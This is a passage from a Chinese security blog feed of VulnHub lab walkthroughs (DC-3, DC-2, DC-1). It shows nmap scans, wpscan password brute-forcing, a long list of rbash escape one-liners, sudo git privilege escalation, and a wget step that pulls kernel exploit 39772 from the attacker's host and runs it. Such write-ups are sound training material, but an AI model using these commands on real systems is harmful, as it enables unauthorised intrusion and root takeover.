git提权也没法使用</p><h4 id="系统漏洞提权"><a href="#系统漏洞提权" class="headerlink" title="系统漏洞提权"></a>系统漏洞提权</h4><h5 id="查看靶机的发行版本信息"><a href="#查看靶机的发行版本信息" class="headerlink" title="查看靶机的发行版本信息"></a>查看靶机的发行版本信息</h5><pre><code>cat /etc/*release或lsb_release -a</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311300854977.png" alt="image-20231129183232534"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311300854742.png" alt="image-20231129202536052"></p><p>得知是<code>Ubuntu 16.04</code>版本</p><p>还是用searchsploit找漏洞</p><pre><code>searchsploit Ubuntu 16.04</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311300854709.png" alt="image-20231129183629093"></p><p>这种都是权限升级的漏洞 选择39772.txt来进行提权</p><pre><code>cat /usr/share/exploitdb/exploits/linux/local/39772.txt</code></pre><p>在最下面找到exp文件下载路径 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311300854917.png" alt="image-20231129210333215"></p><p>建议是在本地下载下来 能解压的都解压 复制粘贴到攻击机上</p><p>下面开启Apache服务 将文件上传到本地的<code>/var/www/html</code>文件夹下 </p><p><strong>(再看wp的时候 我看说是DC-3没有外网 所以选择通过攻击机下载exp文件 但是我在自己试的时候发现是可以直接从39772.txt文件里面的链接下载的 有明白的大佬可以来找我交流一下)</strong></p><pre><code>systemctl start apache2.servicemv 39772.zip /var/www/html</code></pre><p>将攻击机的文件下载到靶机中</p><pre><code>wget http://192.168.160.150/39772.zip// 注意这个url要是攻击机的ip</code></pre><p>下好之后 进行解压</p><pre><code>unzip 39772.zipcd 39772tar -xvf exploit.tar</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311300855431.png" alt="image-20231129211808415"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311300855109.png" alt="image-20231129211829335"></p><p>进入<code>/39772/ebpf_mapfd_doubleput_exploit</code>文件夹下运行exp文件即可</p><pre><code>./compile.sh./doubleput</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311300855436.png" alt="image-20231129213737033"></p><p>拿到root权限 进入root文件夹 找到flag文件</p><pre><code> __        __   _ _   ____                   _ _ _ _  \ \      / /__| | | |  _ \  ___  _ __   ___| | | | |  \ \ /\ / / _ \ | | | | | |/ _ \| &#39;_ \ / _ \ | | | |   \ V  V /  __/ | | | |_| | (_) | | | |  __/_|_|_|_|    \_/\_/ \___|_|_| |____/ \___/|_| |_|\___(_|_|_|_)                                                     Congratulations are in order.  :-)I hope you&#39;ve enjoyed this challenge as I enjoyed making it.If there are any ways that I can improve these little challenges,please let me know.As per usual, comments and complaints can be sent via Twitter to @DCAU7Have a great day!!!!</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311300855616.png" alt="image-20231129214027919"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>至此 DC-3拿下</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;vulnhub靶场DC-3通关wp&quot;&gt;&lt;a href=&quot;#vulnhub靶场DC-3通关wp&quot; class=&quot;headerlink&quot; title=&quot;vulnhub靶场DC-3通关wp&quot;&gt;&lt;/a&gt;vulnhub靶场DC-3通关wp&lt;/h1&gt;&lt;h2 id=&quot;靶场描述&quot;</summary>
      
    
    
    
    <category term="渗透" scheme="http://w3nx1z1.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="打靶" scheme="http://w3nx1z1.github.io/tags/%E6%89%93%E9%9D%B6/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶场记录DC-2</title>
    <link href="http://w3nx1z1.github.io/2023/11/21/vulnhub%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95DC-2/"/>
    <id>http://w3nx1z1.github.io/2023/11/21/vulnhub%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95DC-2/</id>
    <published>2023-11-21T13:12:33.327Z</published>
    <updated>2023-11-28T12:23:20.571Z</updated>
    
    <content type="html"><![CDATA[<h1 id="vulnhub靶场记录DC-2"><a href="#vulnhub靶场记录DC-2" class="headerlink" title="vulnhub靶场记录DC-2"></a>vulnhub靶场记录DC-2</h1><h2 id="靶场描述"><a href="#靶场描述" class="headerlink" title="靶场描述"></a>靶场描述</h2><pre><code>Much like DC-1, DC-2 is another purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing.As with the original DC-1, it&#39;s designed with beginners in mind.Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.Just like with DC-1, there are five flags including the final flag.And again, just like with DC-1, the flags are important for beginners, but not so important for those who have experience.In short, the only flag that really counts, is the final flag.For beginners, Google is your friend. Well, apart from all the privacy concerns etc etc.I haven&#39;t explored all the ways to achieve root, as I scrapped the previous version I had been working on, and started completely fresh apart from the base OS install.</code></pre><h2 id="渗透靶场"><a href="#渗透靶场" class="headerlink" title="渗透靶场"></a>渗透靶场</h2><h3 id="一-信息搜集"><a href="#一-信息搜集" class="headerlink" title="一.信息搜集"></a>一.信息搜集</h3><p>由于靶场还是设置的是NAT模式 和我们的渗透机共享ip 我们直接查看渗透机ip 在使用nmap扫靶机ip</p><pre><code>ifconfignmap 192.168.160.0/24</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311282022558.png" alt="image-20231121213511709"></p><p>可以看到靶场ip是<code>192.168.160.152</code></p><p>在扫一波信息</p><pre><code>nmap -A -p- -v 192.168.160.152</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311282022463.png" alt="image-20231121213618660"></p><pre><code>开放了80端口的网站 存在web服务 使用Apache/2.4.10 但是不能重定向到http://dc-2/ 开放了7744端口 存在ssh服务 OpenSSH版本6.7p1</code></pre><h3 id="二、修改hosts文件-进行重定向"><a href="#二、修改hosts文件-进行重定向" class="headerlink" title="二、修改hosts文件 进行重定向"></a>二、修改hosts文件 进行重定向</h3><p>将扫到的<code>http://dc-2</code>的域名和靶机ip添加到攻击机的hosts文件中</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311220943123.png" alt="image-20231122094333049"></p><p>访问站点 成功 是个wordpress模版搭建的网站</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311220943678.png" alt="image-20231122094355470"></p><h3 id="三、flag1"><a href="#三、flag1" class="headerlink" title="三、flag1"></a>三、flag1</h3><p>在站点处找到flag1</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311220944155.png" alt="image-20231122094449035"></p><pre><code>flag1Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.More passwords is always better, but sometimes you just can’t win them all.Log in as one to see the next flag.If you can’t find it, log in as another.</code></pre><h3 id="四、flag2"><a href="#四、flag2" class="headerlink" title="四、flag2"></a>四、flag2</h3><h4 id="使用cewl生成密码字典"><a href="#使用cewl生成密码字典" class="headerlink" title="使用cewl生成密码字典"></a>使用cewl生成密码字典</h4><p>flag1提示我们使用cewl来生成不同于我们常用的字典 由此来爆破网站后台登陆密码</p><p>先学习一波cewl的姿势</p><pre><code>Cewl是一款采用Ruby开发的应用程序，你可以给它的爬虫指定URL地址和爬取深度，还可以添额外的外部链接，接下来Cewl会给你返回一个字典文件，你可以把字典用到类似John the Ripper这样的密码破解工具中。除此之外，Cewl还提供了命令行工具。</code></pre><p>下面是cewl的一些命令参数</p><pre><code>语法：cewl [url] [options]常规参数选项：-h, –help：显示帮助。-k, –keep：保存下载文件。-d &lt;x&gt;, –depth &lt;x&gt;：爬行深度，默认2。-m, –min_world_length：最小长度，默认最小长度为3。-o, –offsite：允许爬虫访问其他站点。-w, –write：将输出结果写入到文件。-u, –ua &lt;agent&gt;：设置user agent。-n, –no-words：不输出字典。–with-numbers：允许单词中存在数字，跟字母一样。-a, –meta：包括元数据。–meta_file file：输出元数据文件。-e, –email：包括email地址。–email_file &lt;file&gt;：输入邮件地址文件。–meta-temp-dir &lt;dir&gt;：exiftool解析文件时使用的临时目录，默认是/temp。-c, –count：显示发现的每个单词的数量。-v, –verbose：verbose。–debug:提取调试信息。认证–auth_type：Digest或者basic认证。–auth_user：用户名认证。–auth_pass：密码认证。代理–proxy_host：代理主机。–proxy_port：代理端口，默认8080。–proxy_username：用户名代理。–proxy_password：密码代理。</code></pre><p>下面是具体的一些用法 就直接以我们这个目标靶机为例了</p><p><strong>默认方法：</strong></p><pre><code>cewl http://dc-2/</code></pre><p>cewl对站点进行爬虫 生成了一系列密码 并输出在屏幕上</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311221010637.png" alt="image-20231122101042575"></p><p><strong>保存字典文件</strong></p><pre><code>cewl http://dc-2/ -w ~/桌面/dict.txt    </code></pre><p>使用w参数 可以将生成的密码字典进行保存</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311221012765.png" alt="image-20231122101247740"></p><p><strong>生成特定长度的字典</strong></p><pre><code>cewl http://dc-2/ -m 9</code></pre><p>可见 cewl对目标网站进行了爬取 并生成了长度至少为9的密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311221023392.png" alt="image-20231122102350330"></p><p><strong>从网站中获取email</strong></p><pre><code>cewl http://dc-2/ -e -n使用-n隐藏生成的密码字典 </code></pre><p><strong>计算网站字典中重复单词的数量</strong></p><pre><code>cewl http://dc-2/ -c </code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311221034778.png" alt="image-20231122103438726"></p><p><strong>增加爬取深度</strong></p><pre><code>cewl http://dc-2/ -d 3 </code></pre><p>爬取深度默认为2  使用-d参数 可以选择合适的参数</p><p><strong>提取调试信息</strong></p><pre><code>cewl http://dc-2/ --debug</code></pre><p>可以查看网站爬取过程中出现的错误和元数据</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311221043921.png" alt="image-20231122104302817"></p><p><strong>verbose模式</strong></p><pre><code>cewl http://dc-2/ -v</code></pre><p>verbose模式可以列出网站的详细数据</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311221047686.png" alt="image-20231122104758631"></p><p><strong>生成包含数字和字符的字典</strong></p><pre><code>cewl http://dc-2/ --with-numbers</code></pre><p><strong>绕过页面登陆限制</strong></p><pre><code>参数：–auth_type:                      Digest or basic–auth_user:                     Authentication username.–auth_pass:                     Authentication password.</code></pre><pre><code>命令：cewl http://localhost:81/DVWA/DVWA/login.php --auth_type basic --auth_user admin --auth_pass password -v或cewl http://localhost:81/DVWA/DVWA/login.php --auth_type Digest --auth_user admin --auth_pass password -v</code></pre><p><strong>代理URL</strong></p><p>如果目标网站设置了代理服务器的话，Cewl将无法使用默认命令来生成字典。此时你需要使用–proxy option选项来启用代理URL功能：</p><pre><code>cewl --proxy_host 192.168.1.103 --proxy_port 3128 -w dict.txt http://192.168.1.103/wordpress/</code></pre><h4 id="使用wpscan进行爆破"><a href="#使用wpscan进行爆破" class="headerlink" title="使用wpscan进行爆破"></a>使用wpscan进行爆破</h4><p>那我们现在已经成功得到了密码字典 下一步就是找网站登陆用户 使用wpscan对网站进行扫描<font color='red'>(wpscan是针对wordpress模版搭建的网站很常用的漏洞扫描工具)</font></p><p>在学习一波wpscan的姿势</p><pre><code>WPScan是Kali Linux默认自带的一款漏洞扫描工具，它采用Ruby编写，能够扫描WordPress网站中的多种安全漏洞，其中包括主题漏洞、插件漏洞和WordPress本身的漏洞。最新版本WPScan的数据库中包含超过18000种插件漏洞和2600种主题漏洞，并且支持最新版本的WordPress。值得注意的是，它不仅能够扫描类似robots.txt这样的敏感文件，而且还能够检测当前已启用的插件和其他功能。</code></pre><p>下面是常见的命令参数</p><pre><code>语法：wpscan --url [url] -options --url                           要扫描的目标url，允许的协议http、https，默认使用http协议--help                             显示简单的帮助--version                           显示WPScan的版本信息-o                                 输出文件到指定位置-f                                 指定文件输出的格式--user-agent                        使用指定的ua头--random-user-agent             使用随机UA头--max-threads                    最大线程数，默认最大线程为5--proxy                         加载代理--update                        更新漏洞库--force                             不检测目标是否在运行wordpress--api-token                      使用token用于显示漏洞信息--wp-content DIR                自定义指定检测内容--cookie                          指定cookievp                                 结果中显示有漏洞的插件(插件漏洞扫描)vt                               结果中显示存在漏洞的主题(主题漏洞扫描)at                               结果中显示所有主题ap                              结果中显示目标的所有插件tt                                列举缩略图相关的文件--enumerate/-e                    枚举  [option](要枚举的目标)u                               枚举用户名p                                枚举插件(插件扫描)t                                枚举主题(主题扫描)</code></pre><p>进行用户名、主题扫描、插件扫描、插件漏洞扫描、主题漏洞扫描的时候、TimThumbs文件扫描(缩略图相关文件)时 直接使用以下命令</p><pre><code>wpscan --url http://dc-2/ -e u,t,t,vt,vp,tt</code></pre><p>wpscan还可以进行爆破用户名和密码</p><pre><code>wpscan --url http://dc-2/ --wordlist[字典文件] --username[要破解的用户] --threads[开启的线程数]wpscan --url http://dc-2/ -P [密码字典] -U [用户字典]</code></pre><p>下面我们就用wpscan对站点进行扫描 flag1提示我们要爆破用户名和密码 登录之后来找到后面的flag 我们前面用cewl得到了密码字典 在使用wpscan扫一下用户名</p><pre><code>wpscan --url http://dc-2/ -e u</code></pre><p>扫到三个用户名</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311221148513.png" alt="image-20231122114815466"></p><p>下面创建一个用户名字典 进行爆破</p><pre><code>wpscan --url http://dc-2/ -P dict.txt -U user.txt</code></pre><p>找到了jerry和tom两个用户的密码</p><pre><code>jerry / adipiscing                                                                                           tom / parturient   </code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311221151221.png" alt="image-20231122115139193"></p><p>尝试使用这两组用户密码登陆站点后台 一般来说 wp模版搭建的网站后台登陆页面在&#x2F;wp-admin中</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311221153469.png" alt="image-20231122115333428"></p><p>两组任选其一都可以成功登陆</p><p>登陆jerry账号后 在page页找到了flag2</p><pre><code>Flag 2:If you can&#39;t exploit WordPress and take a shortcut, there is another way.Hope you found another entry point.</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311221303551.png" alt="image-20231122130309492"></p><p>但是登陆tom账号后 什么也没发现</p><h3 id="五、flag3"><a href="#五、flag3" class="headerlink" title="五、flag3"></a>五、flag3</h3><h4 id="ssh连接tom"><a href="#ssh连接tom" class="headerlink" title="ssh连接tom"></a>ssh连接tom</h4><p>flag2提示说 如果在wordpress中找不到突破 那就换个方式  在前期信息搜集的时候 我们扫到了开放了端口为7744的ssh服务 </p><p>现在手上有jerry和tom的账号密码 也不用再用hydra爆破密码了 直接ssh连就完了</p><pre><code>ssh jerry@192.168.160.152 -p 7744ssh tom@192.168.160.152 -p 7744</code></pre><p>发现jerry用户登不上去 tom用户可以登陆</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311221617428.png" alt="image-20231122161711383"></p><p>使用ls命令查看当前目录下的文件 找到flag3.txt  但是cat、cd等命令都无法执行 ls命令还可以执行</p><pre><code>ls /home/tom/usr/bin # 查看一下tom账号拥有哪些命令权限</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311221638582.png" alt="image-20231122163817548"></p><p>发现less和vi命令都还可以执行 那就可以读取flag3.txt的内容</p><pre><code>Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311221639501.png" alt="image-20231122163925464"></p><h3 id="六、flag4"><a href="#六、flag4" class="headerlink" title="六、flag4"></a>六、flag4</h3><p>我们现在连上的bash其实是rbash 是受限的bash</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311221642153.png" alt="image-20231122164241125"></p><p>下面来学习一些关于<code>rbash</code>的姿势</p><h4 id="设置rbash"><a href="#设置rbash" class="headerlink" title="设置rbash"></a>设置rbash</h4><pre><code>cp  /bin/bash  /bin/rbash # 复制一个bash 重命名为rbashuseradd -s /bin/rbash tom # 设置用户tom登陆的shell为rbashmkdir -p /home/tom/.bin   # 在tom用户下新建一个.bin目录存放可以执行的命令ln -s  /bin/clear  /home/$tom/.bin/clear  # 设置软链接执行命令编辑文件/home/$tom/.bashrc,添加export PATH=$HOME/.bin/.  文件一定要以# .bashrc为首行.</code></pre><h4 id="绕过rbash"><a href="#绕过rbash" class="headerlink" title="绕过rbash"></a>绕过rbash</h4><p><strong>一、枚举linux环境</strong> </p><pre><code>1.检查常见命令 su cd ls cat等2.检查可用的操作符 &lt; &gt; &lt;&lt; &gt;&gt; | / \等3.root身份可以运行的命令sudo -l4.检查shellecho $SHELL5.检查可用的编程语言 python php ruby perl 6.检查环境变量 执行 env/printenv</code></pre><p><strong>二、绕过方式</strong></p><ol><li><p><code>/</code>字符被允许使用</p><p>直接执行</p><pre><code>/bin/bash</code></pre><p>2.<code>cp</code>命令允许执行</p><pre><code>cp /bin/bash test1cp /bin/sh test2./test1  # 切换到了/bin/bash./test2  # 切换到了/bin/bash</code></pre><p>3.常见应用</p><p>ftp&#x2F;gdb(调试程序的工具)</p><pre><code>ftp &gt; !/bin/shgdb &gt; !/bin/sh</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311221706614.png" alt="image-20231122170643581"></p></li></ol><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311221707134.png" alt="image-20231122170747090"></p><p>man&#x2F;git </p><pre><code>man &gt; !/bin/shgit &gt; git help status</code></pre><p>vim&#x2F;vi</p><pre><code>vim/vi test:!/bin/sh</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311221716374.png" alt="image-20231122171602341"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311221716209.png" alt="image-20231122171612178"></p><p>more&#x2F;less</p><pre><code>more test!/bin/sh</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311221720070.png" alt="image-20231122172043030"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311221720198.png" alt="image-20231122172023168"></p><p>4.set shell</p><pre><code># vim/vi创建一个文件 进入之后:set shell=/bin/sh # 或者用/bin/bash:shell # 切换完成之后还要添加环境变量。给$PATH变量增加两个路径，用来查找命令export PATH=$PATH:/bin/export PATH=$PATH:/usr/bin/</code></pre><p>5.更改PATH或SHELL环境变量 </p><pre><code>BASH_CMDS[a]=/bin/sh;a  注：把/bin/bash给a变量`export PATH=$PATH:/bin/    注：将/bin 作为PATH环境变量导出export PATH=$PATH:/usr/bin   注：将/usr/bin作为PATH环境变量导出</code></pre><p>6.编程语言</p><p>（1）python</p><pre><code>python -c &quot;import os;os.system(&#39;/bin/bash&#39;)&quot;或者python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></pre><p>（2）php</p><pre><code>php -a then exec(&quot;sh -i&quot;)</code></pre><p>（3）perl</p><pre><code>perl -e &quot;exec &#39;/bin/sh&#39;;&quot;</code></pre><p>（4）lua</p><pre><code>os.execute(&#39;/bin/sh&#39;)</code></pre><p>（5）ruby</p><pre><code>exec &quot;/bin/sh&quot;</code></pre><p>7.其他方法</p><p>ssh</p><pre><code>ssh username@IP -t &quot;/bin/sh&quot; or &quot;/bin/bash&quot;</code></pre><p>ssh(2)</p><pre><code>ssh username@IP -t &quot;bash --noprofile&quot;</code></pre><p>ssh(3)</p><pre><code>ssh username@IP -t &quot;() &#123; :; &#125;; /bin/bash&quot; (sehllshock)</code></pre><p>ssh(4)</p><pre><code>ssh -o ProxyCommand=&quot;sh -c /tmp/yourfile.sh&quot; 127.0.0.1 (SUID)</code></pre><p>zip</p><pre><code>zip /tmp/test.zip /tmp/test -T --unzip-command=&quot;sh -c /bin/bash&quot;</code></pre><p>tar</p><pre><code>tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash</code></pre><p>awk(超级玛丽靶机使用它成功了)</p><pre><code>awk &#39;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#39; </code></pre><p>现在绕过rbash的方法基本上就是这些了 现在开始在攻击机中绕过tom账户的rbash权限</p><p>首先，信息搜集 由flag3的部分 我们知道目前可以使用的只有ls vim less scp这些命令可以使用</p><p>在这里 我们使用第4种方法 set shell</p><pre><code>vi:set shell=/bin/sh:shellexport PATH=$PATH:/bin/export PATH=$PATH:/usr/bin/</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311221914940.png" alt="image-20231122191437884"></p><p>成功绕过rbash </p><p>在flag3中还提示我们用<code>su</code>来切换用户 现在我们找一下jerry用户 进入jerry 在目录下找到flag4</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311221916361.png" alt="image-20231122191628316"></p><pre><code>flag4Good to see that you&#39;ve made it this far - but you&#39;re not home yet. You still need to get the final flag (the only flag that really counts!!!).  No hints here - you&#39;re on your own now.  :-)Go on - git outta here!!!!</code></pre><h3 id="七、thefinalflag"><a href="#七、thefinalflag" class="headerlink" title="七、thefinalflag"></a>七、thefinalflag</h3><h4 id="git提权"><a href="#git提权" class="headerlink" title="git提权"></a>git提权</h4><p>flag4告诉我们还有最后一个flag  提到git 可能是让我们使用git进行提权</p><p>首先查看一下jerry用户可以使用的root命令有哪些</p><pre><code>sudo -l</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311221935131.png" alt="image-20231122193526092"></p><p>发现可以无密码使用git命令 正好切合了提示中的git</p><pre><code>sudo git help config!/bin/sh</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311221947041.png" alt="image-20231122194706813"></p><p>成功提权成功 进入root文件夹 找到<code>final-flag.txt</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311221949641.png" alt="image-20231122194905561"></p><pre><code> __    __     _ _       _                    _ / / /\ \ \___| | |   __| | ___  _ __   ___  / \\ \/  \/ / _ \ | |  / _` |/ _ \| &#39;_ \ / _ \/  / \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/   \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/   Congratulatons!!!A special thanks to all those who sent me tweetsand provided me with feedback - it&#39;s all greatlyappreciated.If you enjoyed this CTF, send me a tweet via @DCAU7.</code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>至此 全部flag都被找到</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;vulnhub靶场记录DC-2&quot;&gt;&lt;a href=&quot;#vulnhub靶场记录DC-2&quot; class=&quot;headerlink&quot; title=&quot;vulnhub靶场记录DC-2&quot;&gt;&lt;/a&gt;vulnhub靶场记录DC-2&lt;/h1&gt;&lt;h2 id=&quot;靶场描述&quot;&gt;&lt;a href</summary>
      
    
    
    
    <category term="渗透" scheme="http://w3nx1z1.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="打靶" scheme="http://w3nx1z1.github.io/tags/%E6%89%93%E9%9D%B6/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶场记录DC-1</title>
    <link href="http://w3nx1z1.github.io/2023/10/31/vulnhub%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95DC-1/"/>
    <id>http://w3nx1z1.github.io/2023/10/31/vulnhub%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95DC-1/</id>
    <published>2023-10-31T12:47:36.472Z</published>
    <updated>2023-11-29T09:20:39.183Z</updated>
    
    <content type="html"><![CDATA[<h1 id="vulnhub靶场记录DC-1"><a href="#vulnhub靶场记录DC-1" class="headerlink" title="vulnhub靶场记录DC-1"></a>vulnhub靶场记录DC-1</h1><h2 id="靶机描述"><a href="#靶机描述" class="headerlink" title="靶机描述"></a>靶机描述</h2><pre><code>DC-1 is a purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing.It was designed to be a challenge for beginners, but just how easy it is will depend on your skills and knowledge, and your ability to learn.To successfully complete this challenge, you will require Linux skills, familiarity with the Linux command line and experience with basic penetration testing tools, such as the tools that can be found on Kali Linux, or Parrot Security OS.There are multiple ways of gaining root, however, I have included some flags which contain clues for beginners.There are five flags in total, but the ultimate goal is to find and read the flag in root&#39;s home directory. You don&#39;t even need to be root to do this, however, you will require root privileges.Depending on your skill level, you may be able to skip finding most of these flags and go straight for root.Beginners may encounter challenges that they have never come across previously, but a Google search should be all that is required to obtain the information required to complete this challenge.</code></pre><h2 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h2><p>下载路径</p><pre><code>https://download.vulnhub.com/dc/DC-1.zip</code></pre><p> 使用vmware——文件——打开——导入DC-1.ova——创建靶机</p><h2 id="渗透靶场"><a href="#渗透靶场" class="headerlink" title="渗透靶场"></a>渗透靶场</h2><h3 id="一-信息搜集-寻找真实ip-探端口及服务"><a href="#一-信息搜集-寻找真实ip-探端口及服务" class="headerlink" title="一.信息搜集(寻找真实ip 探端口及服务)"></a>一.信息搜集(寻找真实ip 探端口及服务)</h3><pre><code>目标探测，如：扫描域名、IP、开放端口、确认其使用的软件版本、框架版本等</code></pre><p>我们只需要创建好靶机就可以了 不需要进行登陆 在渗透过程中 不需要登陆root用户 但是需要root权限</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192028518.png" alt="image-20231031191735196"></p><p>由于我们刚刚对于靶机的网络设置是NAT模式  所以靶机是自动获得IP 且和kali是在同一局域网下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192028767.png" alt="image-20231031191903572"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192028423.png" alt="image-20231031192114585"></p><p>可以看到 我们现在kali的ip是<code>192.168.160.131 </code> 那么我们可以使用nmap扫描kali的c段中存活的主机 来找到靶机的真实ip</p><pre><code>nmap 192.168.160.0/24-sP：向目标发送 TCP ACK 的包，如果有响应，则表明目标处于活动状态；</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192028564.png" alt="image-20231117174059741"></p><p>找到靶机ip是<code>192.168.160.146</code></p><p>接下来 在使用nmap探靶机开放的端口</p><pre><code>nmap -T4 -sC -sV 192.168.160.146 或 nmap -A -p- -v 192.168.160.146-sV 参数：探测端口上运行的软件；-A 详细扫描-T4 设定时间强度</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192028986.png" alt="image-20231031194656572"></p><pre><code>开放了22端口 存在ssh服务 OpenSSH版本6.0p1开放了80端口 存在web服务 使用apche httpd版本2.2.22 使用了Drupal7(CMS开源框架 使用php语言编写)开放了111端口 存在rpcbind服务器</code></pre><p>这一步的操作使用</p><pre><code>whatweb -v 192.168.160.146</code></pre><p>也可以进行CMS识别</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192028780.png" alt="image-20231031195321754"></p><h3 id="二-信息分析"><a href="#二-信息分析" class="headerlink" title="二.信息分析"></a>二.信息分析</h3><p>开启了ssh服务 也许有弱口令 可以尝试爆破</p><p>Drupal有公开的RCE漏洞 可以尝试进行验证利用</p><h3 id="三-访问web站点"><a href="#三-访问web站点" class="headerlink" title="三.访问web站点"></a>三.访问web站点</h3><p>访问刚刚扫出来的web站点 是Drupal</p><pre><code>192.168.160.146</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192028740.png" alt="image-20231031200028158"></p><p>使用<code>wappalyzer</code>插件查看网站的相关配置 发现和刚刚扫出来的配置是一样的</p><h3 id="四-利用MSF-msfconsole-进行渗透"><a href="#四-利用MSF-msfconsole-进行渗透" class="headerlink" title="四.利用MSF(msfconsole)进行渗透"></a>四.利用MSF(msfconsole)进行渗透</h3><h4 id="1-msfconsole命令介绍"><a href="#1-msfconsole命令介绍" class="headerlink" title="1.msfconsole命令介绍"></a>1.msfconsole命令介绍</h4><pre><code>msfconsole进入MSF控制台search 搜索相应模块use           对应模块show options  查看信息set RHOST  设置远程主机iprun           攻击(启动模块)host            查看扫描记录back  停止攻击(退出模块)save保存模块配置show exploits/payloads  查看所有攻击模块/查找所有攻击载荷</code></pre><h4 id="2-搜索Drupal7漏洞"><a href="#2-搜索Drupal7漏洞" class="headerlink" title="2.搜索Drupal7漏洞"></a>2.搜索Drupal7漏洞</h4><h5 id="searchsploit"><a href="#searchsploit" class="headerlink" title="searchsploit"></a>searchsploit</h5><p>先使用<code>searchsploit Drupal 7</code>搜索一下Drupal 7的漏洞 可以找到很多</p><p><a href="https://blog.csdn.net/qq_63844103/article/details/128405733?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169875595316800184165844%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=169875595316800184165844&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-2-128405733-null-null.142%5Ev96%5Epc_search_result_base9&utm_term=searchsploit&spm=1018.2226.3001.4187">searchsploit使用介绍</a></p><pre><code>Exploit-db是Kali linux 官方团队维护的一个安全项目，存储了大量的漏洞利用程序，是公认的世界上最大的搜集漏洞的数据库。它的在线版本是https://www.exploit-db.com/ 。而searchsploit可以利用exploit-db提供的数据库进行离线搜索</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192028525.png" alt="image-20231031204251110"></p><p>过滤一下 